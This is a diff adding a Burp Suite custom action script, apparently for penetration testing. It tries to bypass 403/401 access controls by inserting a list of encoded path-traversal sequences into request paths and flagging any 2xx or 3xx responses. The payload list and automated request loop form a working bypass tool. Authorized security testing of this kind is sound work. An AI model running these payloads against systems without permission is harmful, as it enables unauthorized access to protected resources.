@@ -1,0 +1,81 @@
+id: b089c2e1-45f8-4b7b-9c6d-bypass-midpath-001
+name: 403/401 Bypass - Mid-Path Traversal
+function: CUSTOM_ACTION
+location: REPEATER
+source: |+
+  // 403/401 Bypass - Mid-Path Manipulation
+  // Tests bypass by inserting path traversal sequences in the middle of the path
+  
+  int DELAY_MS = 50;
+  boolean VERBOSE = true;
+  
+  String[] MID_PATH_PAYLOADS = {
+      "/../", "/..;/", "/.;/", "/./", "//", "/%2e%2e/", "/%2e/",
+      "/..%00/", "/..%0d/", "/.%00/", ";/../", ";/..;/", "%2f..%2f",
+      "%2f%2e%2e%2f", "%c0%af..%c0%af", "%ef%bc%8f..%ef%bc%8f",
+      "/..%09/", "/..%0a/", "/..%ff/", "/.%2e/", "/%2e./",
+      "/;/../", "/;/..;/", "/.;/../", "/..;/.;/"
+  };
+  
+  var originalRequest = requestResponse.request();
+  var httpService = requestResponse.httpService();
+  var originalPath = originalRequest.path();
+  int originalStatus = requestResponse.response().statusCode();
+  
+  logging.logToOutput("=== 403/401 Bypass - Mid-Path Traversal ===");
+  logging.logToOutput("Target: " + httpService.host() + originalPath);
+  logging.logToOutput("Original Status: " + originalStatus);
+  logging.logToOutput("");
+  
+  int total = 0, success = 0;
+  
+  java.util.function.BiPredicate<Integer, Integer> isSuccess = (orig, curr) -> 
+      (curr >= 200 && curr < 400) && (orig == 401 || orig == 403);
+  
+  // Extract path segments
+  String[] pathParts = originalPath.split("/");
+  if (pathParts.length <= 1) {
+      logging.logToOutput("Path too short for mid-path manipulation");
+      return;
+  }
+  
+  String basePath = "";
+  String lastSegment = pathParts[pathParts.length - 1];
+  for (int i = 0; i < pathParts.length - 1; i++) {
+      if (!pathParts[i].isEmpty()) {
+          basePath += "/" + pathParts[i];
+      }
+  }
+  if (basePath.isEmpty()) basePath = "/";
+  
+  logging.logToOutput("Base path: " + basePath);
+  logging.logToOutput("Last segment: " + lastSegment);
+  logging.logToOutput("");
+  
+  for (String midPayload : MID_PATH_PAYLOADS) {
+      try {
+          String newPath = basePath + midPayload + lastSegment;
+          var req = originalRequest.withPath(newPath);
+          var resp = api.http().sendRequest(req);
+          Thread.sleep(DELAY_MS);
+          
+          int status = resp.response().statusCode();
+          String note = newPath + " -> " + status;
+          
+          if (isSuccess.test(originalStatus, status)) {
+              success++;
+              logging.logToOutput("[+] SUCCESS: " + note);
+              var rr = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(req, resp.response());
+              rr.annotations().setNotes("Mid-Path Bypass: " + note);
+              api.organizer().sendToOrganizer(rr);
+          } else if (VERBOSE) {
+              logging.logToOutput("[-] " + note);
+          }
+          total++;
+      } catch (Exception e) {
+          logging.logToError("Error: " + e.getMessage());
+      }
+  }
+  
+  logging.logToOutput("");
+  logging.logToOutput("=== Complete: " + total + " requests, " + success + " bypasses ===");
